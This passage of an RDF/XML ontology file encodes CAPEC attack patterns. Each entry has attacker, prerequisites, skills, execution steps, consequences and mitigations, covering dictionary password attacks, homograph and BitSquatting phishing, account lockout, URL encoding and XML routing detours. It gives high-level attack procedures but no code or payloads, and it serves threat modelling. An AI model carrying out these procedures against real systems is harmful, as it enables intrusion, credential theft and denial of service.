          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Set up a sniffer The attacker sets up a sniffer in the path between the server and the client and watches the traffic.TECHNIQUE:The attacker sets up a sniffer in the path between the server and the client.::STEP:2:PHASE:Exploit:DESCRIPTION:Capturing Application Code Bound During Patching Attacker knows that the computer/OS/application can request new applications to install  or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase  and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.TECHNIQUE:Attacker loads the sniffer to capture the application code bound during a dynamic update.:TECHNIQUE:The attacker proceeds to reverse engineer the captured code.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker337">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#16">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:49::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Dictionary-based Password Attack"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack337">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#16"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::521::262::263::693::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine application&apos;s/system&apos;s password policy) Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers  special characters  etc.  or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:(Select dictionaries) Pick the dictionaries to be used in the attack (e.g. different languages  specific terminology  etc.)TECHNIQUE:Select dictionary based on particular users&apos; preferred languages.:TECHNIQUE:Select dictionary based on the application/system&apos;s supported languages.::STEP:3:PHASE:Explore:DESCRIPTION:(Determine username(s) to target) Determine username(s) whose passwords to crack.TECHNIQUE:Obtain username(s) by sniffing network packets.:TECHNIQUE:Obtain username(s) by querying application/system (e.g. if upon a failed login attempt  the system indicates whether the entered username was valid or not):TECHNIQUE:Obtain usernames from filesystem (e.g. list of directories in C:Documents and Settings in Windows  and list in /etc/passwd in UNIX-like systems)::STEP:4:PHASE:Exploit:DESCRIPTION:(Use dictionary to crack passwords.) Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.TECHNIQUE:Try all words in the dictionary  as well as common misspellings of the words as passwords for the chosen username(s).:TECHNIQUE:Try common combinations of words in the dictionary  as well as common misspellings of the combinations as passwords for the chosen username(s).::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::521::262::263::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The system uses one factor password based authentication.::The system does not have a sound password policy that is being enforced.::The system does not implement an effective password throttling mechanism.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:A variety of password cracking tools and dictionaries are available to launch this type of an attack.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A machine with sufficient resources for the job (e.g. CPU  RAM  HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker204">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#443"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack204"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the software during the development phase.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::An organization should provide regular  robust cybersecurity training to its employees to prevent social engineering attacks. Avoid sharing unnecessary information during interactions beyond what is absolutely required for effective communication.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack194">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#425">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:416::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Target Influence via Framing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Successful attacks that influence the target via framing into performing an action or sharing sensitive information can result in a variety of consequences that negatively affect the confidentiality of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker336">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#182"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack336"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::184::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be capable of running Flash applications. In some cases  the victim must follow an attacker-supplied link.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to have knowledge of Flash  especially how to insert content the executes commands.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs (such as net) that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack98">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#576">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Group Permission Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker469">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#72">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#URL Encoding"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack469">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#72"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::173::177::171::172::73::21::74::20::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker accesses the server using a specific URL.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker tries to encode some special characters in the URL. The attacker finds out that some characters are not filtered properly.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker crafts a malicious URL string request and sends it to the server.::STEP:4:PHASE:Exploit:DESCRIPTION:The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly  the special characters may have harmful consequences.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::177::171::172::73::21::74::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application should accepts and decodes URL input.::The application performs insufficient filtering/canonicalization on the URLs.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The attacker may write a script to defeat the input filtering mechanism.:LEVEL:Medium::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker203">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#299"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack203"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send a TCP SYN packet to a remote target. Depending upon the operating system  the ability to craft SYN packets may require elevated privileges.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to know how to craft and send protocol commands from the command line or within a tool.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker460">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#31"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack460"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::565::302::311::113::539::20::315::384::472::724::602::642::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target server software must be a HTTP daemon that relies on cookies.::The cookies must contain sensitive information.::The adversary must be able to make HTTP requests to the server  and the cookie must be contained in the reply.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To overwrite session cookie data  and submit targeted attacks via HTTP:LEVEL:Low::SKILL:Exploiting a remote buffer overflow generated by attack:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker157">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#611">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:98::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#BitSquatting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack157">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#611"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine target website) The adversary first determines which website to impersonate  generally one that is trusted and receives a consistent amount of traffic.TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:(Impersonate trusted domain) In order to impersonate the trusted domain  the adversary needs to register the BitSquatted URL.TECHNIQUE:Register the BitSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:(Wait for a user to visit the domain) Finally  the adversary simply waits for a user to be unintentionally directed to the BitSquatted domain.TECHNIQUE:Simply wait for an error in memory to occur  redirecting the user to the malicious domain.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other Depending on the intention of the adversary  a successful BitSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary requires knowledge of popular or high traffic domains  that could be used to deceive potential targets.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Perform comprehensive threat modeling  a process of identifying  evaluating  and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.::When implementing security features  consider how they can be misused and compromised.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack125">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#212">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Functionality Misuse"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Gain Privileges A successful attack of this kind can compromise the confidentiality of an authorized user&apos;s credentials.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Depending on the adversary&apos;s intended technical impact  a successful attack of this kind can compromise any or all elements of the security triad.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker289">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#535"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack289"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Physical access to a gray market reseller&apos;s hardware components supply  or the ability to appear as a gray market reseller to the victim&apos;s buyer.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker156">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#632">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:98::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Homograph Attack via Homoglyphs"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack156">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#632"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine target website) The adversary first determines which website to impersonate  generally one that is trusted and receives a consistent amount of traffic.TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:(Impersonate trusted domain) In order to impersonate the trusted domain  the adversary needs to register the URL containing the homoglpyh character(s).TECHNIQUE:Register the Homograph domain.::STEP:3:PHASE:Exploit:DESCRIPTION:(Deceive user into visiting domain) Finally  the adversary needs to deceive a user into visiting the Homograph domain.TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other Depending on the intention of the adversary  a successful Homograph attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::An adversary requires knowledge of popular or high traffic domains  that could be used to deceive potential targets.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker155">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#616"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack155"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A resource is expected to available to the user.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries can often purchase low-cost technology to implement rogue access points.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker288">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#468"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack288"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::707::149::177::838::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::No new lines can be present in the injected CSS stringProper HTML or URL escaping of the and &apos; characters is not presentThe attacker has control of two injection points: pre-string and post-string::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to craft a CSS injection:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Attacker controlled site/page to render a page referencing the injected CSS string::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker287">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#2">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:212::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Inducing Account Lockout"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack287">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#2"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::645::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:(Investigate account lockout behavior of system) Investigate the security features present in the system that may trigger an account lockoutTECHNIQUE:Analyze system documentation to find list of events that could potentially cause account lockout:TECHNIQUE:Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly:TECHNIQUE:Determine another user&apos;s login ID  and attempt to brute force the password (or other credentials) for it a predetermined number of times  or until the system provides an indication that the account is locked out.::STEP:2:PHASE:Experiment:DESCRIPTION:(Obtain list of user accounts to lock out) Generate a list of valid user accounts to lock outTECHNIQUE:Obtain list of authorized users using another attack pattern  such as SQL Injection.:TECHNIQUE:Attempt to create accounts if possible; system should indicate if a user ID is already taken.:TECHNIQUE:Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.::STEP:3:PHASE:Exploit:DESCRIPTION:(Lock Out Accounts) Perform lockout procedure for all accounts that the attacker wants to lock out.TECHNIQUE:For each user ID to be locked out  perform the lockout procedure discovered in the first step.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::645::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The system has a lockout mechanism.::An attacker must be able to reproduce behavior that would result in an account being locked.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Computer with access to the login portion of the target system::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker154">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#641">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:159::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#DLL Side-Loading"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack154">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#641"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::706::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::706::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must fail to verify the integrity of the DLL before using them.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Trick the operating system in loading a malicious DLL instead of a legitimate DLL.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker331">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#219">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:94::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Routing Detour Attacks"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack331">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#219"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::441::610::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using command line or an automated tool  an attacker records all instances of web services to process XML requests.TECHNIQUE:Use automated tool to record all instances to process XML requests or find exposed WSDL.:TECHNIQUE:Use tools to crawl WSDL::STEP:2:PHASE:Experiment:DESCRIPTION:(Identify SOAP messages that have multiple state processing.) Inspect instance to see whether the XML processing has multiple stages or not.TECHNIQUE:Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.::STEP:3:PHASE:Exploit:DESCRIPTION:(Launch an XML routing detour attack) The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus  the attacker can route the XML message to the attacker controlled node (and access the message contents).TECHNIQUE:The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message::"/>
        </j.0:executes>
        <j.0:implies>
